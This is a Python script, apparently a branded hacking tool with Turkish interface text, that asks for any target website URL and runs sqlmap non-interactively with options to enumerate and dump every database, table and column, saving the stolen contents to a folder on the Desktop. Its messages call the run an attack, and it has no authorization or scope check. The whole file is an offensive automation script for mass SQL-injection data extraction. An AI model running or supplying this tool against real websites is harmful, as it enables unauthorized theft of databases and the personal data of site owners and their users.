import os
import re
import subprocess
from urllib.parse import urlparse
from colorama import Fore, Style, init

init(autoreset=True)

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def print_banner():
    banner = f"""
{Fore.RED}██╗      █████╗ ██╗  ██╗ ██████╗███████╗██╗   ██╗
{Fore.RED}██║     ██╔══██╗██║ ██╔╝██╔════╝██╔════╝╚██╗ ██╔╝
{Fore.RED}██║     ███████║█████╔╝ ██║     █████╗   ╚████╔╝ 
{Fore.RED}██║     ██╔══██║██╔═██╗ ██║     ██╔══╝    ╚██╔╝  
{Fore.RED}███████╗██║  ██║██║  ██╗╚██████╗███████╗   ██║   
{Fore.RED}╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚══════╝   ╚═╝   
{Style.RESET_ALL}"""
    print(banner)

def is_valid_url(url):
    # HTTP/HTTPS dışında URL geçerli kabul edilmez
    pattern = re.compile(r'^(http|https)://[a-zA-Z0-9.-]+(?:\.[a-zA-Z]{2,})+.*$')
    return bool(pattern.match(url))

def run_sqlmap(target_url):
    parsed_url = urlparse(target_url)
    domain_name = parsed_url.netloc.replace('.', '_')
    
    desktop_path = os.path.join(os.path.expanduser("~"), "Desktop", "l1xcy-tool", "sqlmap")
    os.makedirs(desktop_path, exist_ok=True)
    
    output_file = os.path.join(desktop_path, f"{domain_name}_l1xcy.txt")
    command = ["sqlmap", "-u", target_url, "--batch", "--dbs", "--tables", "--columns", "--dump", "--answers=Y"]
    
    print(f"{Fore.YELLOW}[+] SQLMap saldırısı başlatılıyor...{Style.RESET_ALL}")
    
    try:
        with open(output_file, "w") as f:
            result = subprocess.run(command, stdout=f, stderr=subprocess.STDOUT)
        if result.returncode != 0:
            print(f"{Fore.RED}[-] SQLMap komutunda bir hata oluştu!{Style.RESET_ALL}")
            return
    except Exception as e:
        print(f"{Fore.RED}[-] Hata: {str(e)}{Style.RESET_ALL}")
        return

    # Sonuçları oku ve kullanıcıya bildir
    with open(output_file, "r") as f:
        content = f.read()
    
    if "not injectable" in content or "No vulnerabilities found" in content:
        print(f"{Fore.RED}[-] Bu sitede açık bulunamadı.{Style.RESET_ALL}")
    else:
        print(f"{Fore.GREEN}[+] Sonuçlar {output_file} konumuna kaydedildi.{Style.RESET_ALL}")

def main():
    clear_screen()
    print_banner()
    
    while True:
        url = input(f"{Fore.CYAN}Hedef site URL'sini girin: {Style.RESET_ALL}")
        
        if not is_valid_url(url):
            print(f"{Fore.RED}[-] Düzgün bir URL giriniz!{Style.RESET_ALL}")
        else:
            print(f"{Fore.GREEN}[+] Doğru URL, SQLMap başlatılıyor...{Style.RESET_ALL}")
            run_sqlmap(url)
            # İşlem tamamlandıktan sonra kapanmak isteyip istemediğini soralım.
            close_program = input(f"{Fore.YELLOW}İşlem tamamlandı. Programı kapatmak istiyor musunuz? (Evet/Hayır): {Style.RESET_ALL}")
            if close_program.lower() in ['evet', 'e']:
                print(f"{Fore.GREEN}Program kapanıyor...{Style.RESET_ALL}")
                break  # Programı sonlandırıyoruz
            else:
                print(f"{Fore.CYAN}Yine de işlem yapmak için devam edebilirsiniz...{Style.RESET_ALL}")
                continue  # Tekrar URL girmeye devam et

if __name__ == "__main__":
    main()
